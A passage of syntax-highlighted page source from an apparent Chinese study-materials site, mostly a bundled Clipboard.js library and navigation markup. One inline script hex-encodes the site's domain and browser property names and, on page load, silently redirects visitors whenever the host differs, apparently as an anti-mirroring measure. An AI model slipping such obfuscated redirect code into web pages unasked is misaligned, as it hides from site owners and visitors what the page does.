class="keyword">this</span>.e = &#123;&#125;))[t] || []).slice(),</span></span><br><span class="line"><span class="undefined">              o = 0,</span></span><br><span class="line"><span class="undefined">              r = n.length;</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">for</span> (o; o &lt; r; o++) n[o].fn.apply(n[o].ctx, e);</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">return</span> <span class="keyword">this</span></span></span><br><span class="line"><span class="undefined">          &#125;,</span></span><br><span class="line"><span class="actionscript">          off: <span class="function"><span class="keyword">function</span><span class="params">(t, e)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">var</span> n = <span class="keyword">this</span>.e || (<span class="keyword">this</span>.e = &#123;&#125;),</span></span><br><span class="line"><span class="undefined">              o = n[t],</span></span><br><span class="line"><span class="undefined">              r = [];</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">if</span> (o &amp;&amp; e)</span></span><br><span class="line"><span class="actionscript">              <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>, a = o.length; i &lt; a; i++) o[i].fn !== e &amp;&amp; o[i].fn._ !== e &amp;&amp; r.push(o[i]);</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">return</span> r.length ? n[t] = r : <span class="keyword">delete</span> n[t], <span class="keyword">this</span></span></span><br><span class="line"><span class="undefined">          &#125;</span></span><br><span class="line"><span class="undefined">        &#125;, t.exports = n</span></span><br><span class="line"><span class="actionscript">      &#125;, <span class="function"><span class="keyword">function</span><span class="params">(t, e, n)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> o, r, i;</span></span><br><span class="line"><span class="actionscript">        ! <span class="function"><span class="keyword">function</span><span class="params">(a, c)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">          r = [t, n(<span class="number">0</span>), n(<span class="number">2</span>), n(<span class="number">1</span>)], o = c, <span class="keyword">void</span> <span class="number">0</span> !== (i = <span class="string">"function"</span> == <span class="keyword">typeof</span> o ? o.apply(e, r) : o) &amp;&amp; (t.exports = i)</span></span><br><span class="line"><span class="actionscript">        &#125;(<span class="number">0</span>, <span class="function"><span class="keyword">function</span><span class="params">(t, e, n, o)</span> </span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="meta">          "use strict"</span>;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="actionscript">          <span class="function"><span class="keyword">function</span> <span class="title">r</span><span class="params">(t)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">return</span> t &amp;&amp; t.__esModule ? t : &#123;</span></span><br><span class="line"><span class="actionscript">              <span class="keyword">default</span>: t</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="undefined">          &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="actionscript">          <span class="function"><span class="keyword">function</span> <span class="title">i</span><span class="params">(t, e)</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">if</span> (!(t <span class="keyword">instanceof</span> e)) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">TypeError</span>(<span class="string">"Cannot call a class as a function"</span>)</span></span><br><span class="line"><span class="undefined">          &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="actionscript">          <span class="function"><span class="keyword">function</span> <span class="title">a</span><span class="params">(t, e)</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">if</span> (!t) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">ReferenceError</span>(<span class="string">"this hasn't been initialised - super() hasn't been called"</span>);</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">return</span> !e || <span class="string">"object"</span> != <span class="keyword">typeof</span> e &amp;&amp; <span class="string">"function"</span> != <span class="keyword">typeof</span> e ? t : e</span></span><br><span class="line"><span class="undefined">          &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="actionscript">          <span class="function"><span class="keyword">function</span> <span class="title">c</span><span class="params">(t, e)</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">if</span> (<span class="string">"function"</span> != <span class="keyword">typeof</span> e &amp;&amp; <span class="literal">null</span> !== e) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">TypeError</span>(<span class="string">"Super expression must either be null or a function, not "</span> + <span class="keyword">typeof</span> e);</span></span><br><span class="line"><span class="javascript">            t.prototype = <span class="built_in">Object</span>.create(e &amp;&amp; e.prototype, &#123;</span></span><br><span class="line"><span class="javascript">              <span class="keyword">constructor</span>: &#123;</span></span><br><span class="line"><span class="undefined">                value: t,</span></span><br><span class="line"><span class="undefined">                enumerable: !1,</span></span><br><span class="line"><span class="undefined">                writable: !0,</span></span><br><span class="line"><span class="undefined">                configurable: !0</span></span><br><span class="line"><span class="undefined">              &#125;</span></span><br><span class="line"><span class="javascript">            &#125;), e &amp;&amp; (<span class="built_in">Object</span>.setPrototypeOf ? <span class="built_in">Object</span>.setPrototypeOf(t, e) : t.__proto__ = e)</span></span><br><span class="line"><span class="undefined">          &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="actionscript">          <span class="function"><span class="keyword">function</span> <span class="title">u</span><span class="params">(t, e)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">var</span> n = <span class="string">"data-clipboard-"</span> + t;</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">if</span> (e.hasAttribute(n)) <span class="keyword">return</span> e.getAttribute(n)</span></span><br><span class="line"><span class="undefined">          &#125;</span></span><br><span class="line"><span class="actionscript">          <span class="keyword">var</span> l = r(e),</span></span><br><span class="line"><span class="undefined">            s = r(n),</span></span><br><span class="line"><span class="undefined">            f = r(o),</span></span><br><span class="line"><span class="javascript">            d = <span class="string">"function"</span> == <span class="keyword">typeof</span> <span class="built_in">Symbol</span> &amp;&amp; <span class="string">"symbol"</span> == <span class="keyword">typeof</span> <span class="built_in">Symbol</span>.iterator ? <span class="function"><span class="keyword">function</span>(<span class="params">t</span>) </span>&#123;</span></span><br><span class="line"><span class="actionscript">              <span class="keyword">return</span> <span class="keyword">typeof</span> t</span></span><br><span class="line"><span class="actionscript">            &#125; : <span class="function"><span class="keyword">function</span><span class="params">(t)</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">              <span class="keyword">return</span> t &amp;&amp; <span class="string">"function"</span> == <span class="keyword">typeof</span> <span class="built_in">Symbol</span> &amp;&amp; t.constructor === <span class="built_in">Symbol</span> &amp;&amp; t !== <span class="built_in">Symbol</span>.prototype ? <span class="string">"symbol"</span> : <span class="keyword">typeof</span> t</span></span><br><span class="line"><span class="undefined">            &#125;,</span></span><br><span class="line"><span class="actionscript">            h = <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">              <span class="function"><span class="keyword">function</span> <span class="title">t</span><span class="params">(t, e)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">                <span class="keyword">for</span> (<span class="keyword">var</span> n = <span class="number">0</span>; n &lt; e.length; n++) &#123;</span></span><br><span class="line"><span class="actionscript">                  <span class="keyword">var</span> o = e[n];</span></span><br><span class="line"><span class="javascript">                  o.enumerable = o.enumerable || !<span class="number">1</span>, o.configurable = !<span class="number">0</span>, <span class="string">"value"</span> <span class="keyword">in</span> o &amp;&amp; (o.writable = !<span class="number">0</span>), <span class="built_in">Object</span>.defineProperty(t, o.key, o)</span></span><br><span class="line"><span class="undefined">                &#125;</span></span><br><span class="line"><span class="undefined">              &#125;</span></span><br><span class="line"><span class="actionscript">              <span class="keyword">return</span> <span class="function"><span class="keyword">function</span><span class="params">(e, n, o)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">                <span class="keyword">return</span> n &amp;&amp; t(e.prototype, n), o &amp;&amp; t(e, o), e</span></span><br><span class="line"><span class="undefined">              &#125;</span></span><br><span class="line"><span class="undefined">            &#125;(),</span></span><br><span class="line"><span class="actionscript">            p = <span class="function"><span class="keyword">function</span><span class="params">(t)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">              <span class="function"><span class="keyword">function</span> <span class="title">e</span><span class="params">(t, n)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">                i(<span class="keyword">this</span>, e);</span></span><br><span class="line"><span class="javascript">                <span class="keyword">var</span> o = a(<span class="keyword">this</span>, (e.__proto__ || <span class="built_in">Object</span>.getPrototypeOf(e)).call(<span class="keyword">this</span>));</span></span><br><span class="line"><span class="actionscript">                <span class="keyword">return</span> o.resolveOptions(n), o.listenClick(t), o</span></span><br><span class="line"><span class="undefined">              &#125;</span></span><br><span class="line"><span class="actionscript">              <span class="keyword">return</span> c(e, t), h(e, [&#123;</span></span><br><span class="line"><span class="actionscript">                key: <span class="string">"resolveOptions"</span>,</span></span><br><span class="line"><span class="actionscript">                value: <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">                  <span class="keyword">var</span> t = <span class="built_in">arguments</span>.length &gt; <span class="number">0</span> &amp;&amp; <span class="keyword">void</span> <span class="number">0</span> !== <span class="built_in">arguments</span>[<span class="number">0</span>] ? <span class="built_in">arguments</span>[<span class="number">0</span>] : &#123;&#125;;</span></span><br><span class="line"><span class="actionscript">                  <span class="keyword">this</span>.action = <span class="string">"function"</span> == <span class="keyword">typeof</span> t.action ? t.action : <span class="keyword">this</span>.defaultAction, <span class="keyword">this</span>.target = <span class="string">"function"</span> == <span class="keyword">typeof</span> t.target ? t.target : <span class="keyword">this</span>.defaultTarget, <span class="keyword">this</span>.text = <span class="string">"function"</span> == <span class="keyword">typeof</span> t.text ? t.text : <span class="keyword">this</span>.defaultText,</span></span><br><span class="line"><span class="javascript">                    <span class="keyword">this</span>.container = <span class="string">"object"</span> === d(t.container) ? t.container : <span class="built_in">document</span>.body</span></span><br><span class="line"><span class="undefined">                &#125;</span></span><br><span class="line"><span class="undefined">              &#125;, &#123;</span></span><br><span class="line"><span class="actionscript">                key: <span class="string">"listenClick"</span>,</span></span><br><span class="line"><span class="actionscript">                value: <span class="function"><span class="keyword">function</span><span class="params">(t)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">                  <span class="keyword">var</span> e = <span class="keyword">this</span>;</span></span><br><span class="line"><span class="actionscript">                  <span class="keyword">this</span>.listener = (<span class="number">0</span>, f.default)(t, <span class="string">"click"</span>, <span class="function"><span class="keyword">function</span><span class="params">(t)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">                    <span class="keyword">return</span> e.onClick(t)</span></span><br><span class="line"><span class="undefined">                  &#125;)</span></span><br><span class="line"><span class="undefined">                &#125;</span></span><br><span class="line"><span class="undefined">              &#125;, &#123;</span></span><br><span class="line"><span class="actionscript">                key: <span class="string">"onClick"</span>,</span></span><br><span class="line"><span class="actionscript">                value: <span class="function"><span class="keyword">function</span><span class="params">(t)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">                  <span class="keyword">var</span> e = t.delegateTarget || t.currentTarget;</span></span><br><span class="line"><span class="actionscript">                  <span class="keyword">this</span>.clipboardAction &amp;&amp; (<span class="keyword">this</span>.clipboardAction = <span class="literal">null</span>), <span class="keyword">this</span>.clipboardAction = <span class="keyword">new</span> l.default(&#123;</span></span><br><span class="line"><span class="actionscript">                    action: <span class="keyword">this</span>.action(e),</span></span><br><span class="line"><span class="actionscript">                    target: <span class="keyword">this</span>.target(e),</span></span><br><span class="line"><span class="actionscript">                    text: <span class="keyword">this</span>.text(e),</span></span><br><span class="line"><span class="actionscript">                    container: <span class="keyword">this</span>.container,</span></span><br><span class="line"><span class="undefined">                    trigger: e,</span></span><br><span class="line"><span class="actionscript">                    emitter: <span class="keyword">this</span></span></span><br><span class="line"><span class="undefined">                  &#125;)</span></span><br><span class="line"><span class="undefined">                &#125;</span></span><br><span class="line"><span class="undefined">              &#125;, &#123;</span></span><br><span class="line"><span class="actionscript">                key: <span class="string">"defaultAction"</span>,</span></span><br><span class="line"><span class="actionscript">                value: <span class="function"><span class="keyword">function</span><span class="params">(t)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">                  <span class="keyword">return</span> u(<span class="string">"action"</span>, t)</span></span><br><span class="line"><span class="undefined">                &#125;</span></span><br><span class="line"><span class="undefined">              &#125;, &#123;</span></span><br><span class="line"><span class="actionscript">                key: <span class="string">"defaultTarget"</span>,</span></span><br><span class="line"><span class="actionscript">                value: <span class="function"><span class="keyword">function</span><span class="params">(t)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">                  <span class="keyword">var</span> e = u(<span class="string">"target"</span>, t);</span></span><br><span class="line"><span class="javascript">                  <span class="keyword">if</span> (e) <span class="keyword">return</span> <span class="built_in">document</span>.querySelector(e)</span></span><br><span class="line"><span class="undefined">                &#125;</span></span><br><span class="line"><span class="undefined">              &#125;, &#123;</span></span><br><span class="line"><span class="actionscript">                key: <span class="string">"defaultText"</span>,</span></span><br><span class="line"><span class="actionscript">                value: <span class="function"><span class="keyword">function</span><span class="params">(t)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">                  <span class="keyword">return</span> u(<span class="string">"text"</span>, t)</span></span><br><span class="line"><span class="undefined">                &#125;</span></span><br><span class="line"><span class="undefined">              &#125;, &#123;</span></span><br><span class="line"><span class="actionscript">                key: <span class="string">"destroy"</span>,</span></span><br><span class="line"><span class="actionscript">                value: <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">                  <span class="keyword">this</span>.listener.destroy(), <span class="keyword">this</span>.clipboardAction &amp;&amp; (<span class="keyword">this</span>.clipboardAction.destroy(), <span class="keyword">this</span>.clipboardAction = <span class="literal">null</span>)</span></span><br><span class="line"><span class="undefined">                &#125;</span></span><br><span class="line"><span class="undefined">              &#125;], [&#123;</span></span><br><span class="line"><span class="actionscript">                key: <span class="string">"isSupported"</span>,</span></span><br><span class="line"><span class="actionscript">                value: <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">                  <span class="keyword">var</span> t = <span class="built_in">arguments</span>.length &gt; <span class="number">0</span> &amp;&amp; <span class="keyword">void</span> <span class="number">0</span> !== <span class="built_in">arguments</span>[<span class="number">0</span>] ? <span class="built_in">arguments</span>[<span class="number">0</span>] : [<span class="string">"copy"</span>, <span class="string">"cut"</span>],</span></span><br><span class="line"><span class="actionscript">                    e = <span class="string">"string"</span> == <span class="keyword">typeof</span> t ? [t] : t,</span></span><br><span class="line"><span class="javascript">                    n = !!<span class="built_in">document</span>.queryCommandSupported;</span></span><br><span class="line"><span class="actionscript">                  <span class="keyword">return</span> e.forEach(<span class="function"><span class="keyword">function</span><span class="params">(t)</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">                    n = n &amp;&amp; !!<span class="built_in">document</span>.queryCommandSupported(t)</span></span><br><span class="line"><span class="undefined">                  &#125;), n</span></span><br><span class="line"><span class="undefined">                &#125;</span></span><br><span class="line"><span class="undefined">              &#125;]), e</span></span><br><span class="line"><span class="undefined">            &#125;(s.default);</span></span><br><span class="line"><span class="undefined">          t.exports = p</span></span><br><span class="line"><span class="undefined">        &#125;)</span></span><br><span class="line"><span class="actionscript">      &#125;, <span class="function"><span class="keyword">function</span><span class="params">(t, e)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="function"><span class="keyword">function</span> <span class="title">n</span><span class="params">(t, e)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">          <span class="keyword">for</span> (; t &amp;&amp; t.nodeType !== o;) &#123;</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">if</span> (<span class="string">"function"</span> == <span class="keyword">typeof</span> t.matches &amp;&amp; t.matches(e)) <span class="keyword">return</span> t;</span></span><br><span class="line"><span class="undefined">            t = t.parentNode</span></span><br><span class="line"><span class="undefined">          &#125;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> o = <span class="number">9</span>;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">if</span> (<span class="string">"undefined"</span> != <span class="keyword">typeof</span> Element &amp;&amp; !Element.prototype.matches) &#123;</span></span><br><span class="line"><span class="actionscript">          <span class="keyword">var</span> r = Element.prototype;</span></span><br><span class="line"><span class="undefined">          r.matches = r.matchesSelector || r.mozMatchesSelector || r.msMatchesSelector || r.oMatchesSelector || r.webkitMatchesSelector</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">        t.exports = n</span></span><br><span class="line"><span class="actionscript">      &#125;, <span class="function"><span class="keyword">function</span><span class="params">(t, e, n)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="function"><span class="keyword">function</span> <span class="title">o</span><span class="params">(t, e, n, o, r)</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">          <span class="keyword">var</span> a = i.apply(<span class="keyword">this</span>, <span class="built_in">arguments</span>);</span></span><br><span class="line"><span class="actionscript">          <span class="keyword">return</span> t.addEventListener(n, a, r), &#123;</span></span><br><span class="line"><span class="actionscript">            destroy: <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="undefined">              t.removeEventListener(n, a, r)</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="undefined">          &#125;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="actionscript">        <span class="function"><span class="keyword">function</span> <span class="title">r</span><span class="params">(t, e, n, r, i)</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">          <span class="keyword">return</span> <span class="string">"function"</span> == <span class="keyword">typeof</span> t.addEventListener ? o.apply(<span class="literal">null</span>, <span class="built_in">arguments</span>) : <span class="string">"function"</span> == <span class="keyword">typeof</span> n ? o.bind(<span class="literal">null</span>, <span class="built_in">document</span>).apply(<span class="literal">null</span>, <span class="built_in">arguments</span>) : (<span class="string">"string"</span> == <span class="keyword">typeof</span> t &amp;&amp; (t = <span class="built_in">document</span>.querySelectorAll(t)), <span class="built_in">Array</span>.prototype.map.call(</span></span><br><span class="line"><span class="undefined">            t,</span></span><br><span class="line"><span class="actionscript">            <span class="function"><span class="keyword">function</span><span class="params">(t)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">              <span class="keyword">return</span> o(t, e, n, r, i)</span></span><br><span class="line"><span class="undefined">            &#125;))</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="actionscript">        <span class="function"><span class="keyword">function</span> <span class="title">i</span><span class="params">(t, e, n, o)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">          <span class="keyword">return</span> <span class="function"><span class="keyword">function</span><span class="params">(n)</span> </span>&#123;</span></span><br><span class="line"><span class="undefined">            n.delegateTarget = a(n.target, e), n.delegateTarget &amp;&amp; o.call(t, n)</span></span><br><span class="line"><span class="undefined">          &#125;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> a = n(<span class="number">4</span>);</span></span><br><span class="line"><span class="undefined">        t.exports = r</span></span><br><span class="line"><span class="actionscript">      &#125;, <span class="function"><span class="keyword">function</span><span class="params">(t, e)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">        e.node = <span class="function"><span class="keyword">function</span><span class="params">(t)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">          <span class="keyword">return</span> <span class="keyword">void</span> <span class="number">0</span> !== t &amp;&amp; t <span class="keyword">instanceof</span> HTMLElement &amp;&amp; <span class="number">1</span> === t.nodeType</span></span><br><span class="line"><span class="actionscript">        &#125;, e.nodeList = <span class="function"><span class="keyword">function</span><span class="params">(t)</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">          <span class="keyword">var</span> n = <span class="built_in">Object</span>.prototype.toString.call(t);</span></span><br><span class="line"><span class="actionscript">          <span class="keyword">return</span> <span class="keyword">void</span> <span class="number">0</span> !== t &amp;&amp; (<span class="string">"[object NodeList]"</span> === n || <span class="string">"[object HTMLCollection]"</span> === n) &amp;&amp; <span class="string">"length"</span> <span class="keyword">in</span> t &amp;&amp; (<span class="number">0</span> === t.length || e.node(t[<span class="number">0</span>]))</span></span><br><span class="line"><span class="actionscript">        &#125;, e.string = <span class="function"><span class="keyword">function</span><span class="params">(t)</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">          <span class="keyword">return</span> <span class="string">"string"</span> == <span class="keyword">typeof</span> t || t <span class="keyword">instanceof</span> <span class="built_in">String</span></span></span><br><span class="line"><span class="actionscript">        &#125;, e.fn = <span class="function"><span class="keyword">function</span><span class="params">(t)</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">          <span class="keyword">return</span> <span class="string">"[object Function]"</span> === <span class="built_in">Object</span>.prototype.toString.call(t)</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="actionscript">      &#125;, <span class="function"><span class="keyword">function</span><span class="params">(t, e)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="function"><span class="keyword">function</span> <span class="title">n</span><span class="params">(t)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">          <span class="keyword">var</span> e;</span></span><br><span class="line"><span class="actionscript">          <span class="keyword">if</span> (<span class="string">"SELECT"</span> === t.nodeName) t.focus(), e = t.value;</span></span><br><span class="line"><span class="actionscript">          <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">"INPUT"</span> === t.nodeName || <span class="string">"TEXTAREA"</span> === t.nodeName) &#123;</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">var</span> n = t.hasAttribute(<span class="string">"readonly"</span>);</span></span><br><span class="line"><span class="actionscript">            n || t.setAttribute(<span class="string">"readonly"</span>, <span class="string">""</span>), t.select(), t.setSelectionRange(<span class="number">0</span>, t.value.length), n || t.removeAttribute(<span class="string">"readonly"</span>), e = t.value</span></span><br><span class="line"><span class="actionscript">          &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="actionscript">            t.hasAttribute(<span class="string">"contenteditable"</span>) &amp;&amp; t.focus();</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> o = <span class="built_in">window</span>.getSelection(),</span></span><br><span class="line"><span class="javascript">              r = <span class="built_in">document</span>.createRange();</span></span><br><span class="line"><span class="undefined">            r.selectNodeContents(t), o.removeAllRanges(), o.addRange(r), e = o.toString()</span></span><br><span class="line"><span class="undefined">          &#125;</span></span><br><span class="line"><span class="actionscript">          <span class="keyword">return</span> e</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">        t.exports = n</span></span><br><span class="line"><span class="undefined">      &#125;])</span></span><br><span class="line"><span class="undefined">    &#125;);</span></span><br><span class="line"><span class="undefined">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> clipboard = <span class="keyword">new</span> ClipboardJS(<span class="string">'.entry-content'</span>, &#123;</span></span><br><span class="line"><span class="actionscript">      text: <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="comment">//return '';</span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">      &#125;</span></span><br><span class="line"><span class="undefined">    &#125;);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="actionscript">    clipboard.on(<span class="string">'success'</span>, <span class="function"><span class="keyword">function</span><span class="params">(e)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">      <span class="comment">//console.log(e);</span></span></span><br><span class="line"><span class="undefined">    &#125;);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="actionscript">    clipboard.on(<span class="string">'error'</span>, <span class="function"><span class="keyword">function</span><span class="params">(e)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">      <span class="comment">//console.log(e);</span></span></span><br><span class="line"><span class="undefined">    &#125;);</span></span><br><span class="line"><span class="undefined">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript">    str = <span class="string">"\x77\x77\x77\x2e\x67\x65\x62\x69\x64\x65\x6d\x65\x6e\x67\x6d\x69\x61\x6e\x72\x65\x6e\x2e\x63\x6f\x6d"</span>;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">if</span> (<span class="built_in">window</span>[<span class="string">"\x64\x6f\x63\x75\x6d\x65\x6e\x74"</span>][<span class="string">"\x6c\x6f\x63\x61\x74\x69\x6f\x6e"</span>][<span class="string">"\x68\x6f\x73\x74"</span>] != str) &#123;</span></span><br><span class="line"><span class="javascript">      location[<span class="string">"\x68\x72\x65\x66"</span>] = location[<span class="string">"\x68\x72\x65\x66"</span>][<span class="string">"\x72\x65\x70\x6c\x61\x63\x65"</span>](<span class="built_in">window</span>[<span class="string">"\x64\x6f\x63\x75\x6d\x65\x6e\x74"</span>][<span class="string">"\x6c\x6f\x63\x61\x74\x69\x6f\x6e"</span>][<span class="string">"\x68\x6f\x73\x74"</span>], str);</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"header-top"</span> <span class="attr">class</span>=<span class="string">"header-bar-wrap"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"page"</span> <span class="attr">class</span>=<span class="string">"hfeed site"</span>&gt;</span> <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"skip-link screen-reader-text"</span> <span class="attr">href</span>=<span class="string">"#content"</span>&gt;</span>Skip to content<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">header</span> <span class="attr">id</span>=<span class="string">"masthead"</span> <span class="attr">class</span>=<span class="string">"site-header clearfix"</span> <span class="attr">role</span>=<span class="string">"banner"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"header-main container clearfix"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"logo"</span> <span class="attr">class</span>=<span class="string">"site-branding clearfix"</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"site-title"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://www.gebidemengmianren.com/"</span> <span class="attr">rel</span>=<span class="string">"home"</span>&gt;</span>隔壁的萌面人<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"site-description"</span>&gt;</span>最专业的大学资料分享平台<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"header-widgets clearfix"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"main-navigation-wrap"</span> <span class="attr">class</span>=<span class="string">"primary-navigation-wrap"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">nav</span> <span class="attr">id</span>=<span class="string">"main-navigation"</span> <span class="attr">class</span>=<span class="string">"primary-navigation navigation container clearfix"</span> <span class="attr">role</span>=<span class="string">"navigation"</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">ul</span> <span class="attr">id</span>=<span class="string">"menu-menu-1"</span> <span class="attr">class</span>=<span class="string">"main-navigation-menu"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span> <span class="attr">id</span>=<span class="string">"menu-item-2987"</span> <span class="attr">class</span>=<span class="string">"menu-item menu-item-type-post_type menu-item-object-page menu-item-2987"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://www.gebidemengmianren.com/question-and-answer"</span>&gt;</span>常见问题解答<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span> <span class="attr">id</span>=<span class="string">"menu-item-2988"</span> <span class="attr">class</span>=<span class="string">"menu-item menu-item-type-taxonomy menu-item-object-category menu-item-2988"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://www.gebidemengmianren.com/category/zhihuishu"</span>&gt;</span>智慧树<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span> <span class="attr">id</span>=<span class="string">"menu-item-2989"</span> <span class="attr">class</span>=<span class="string">"menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-2989"</span>&gt;</span><span class="tag">&lt;<span 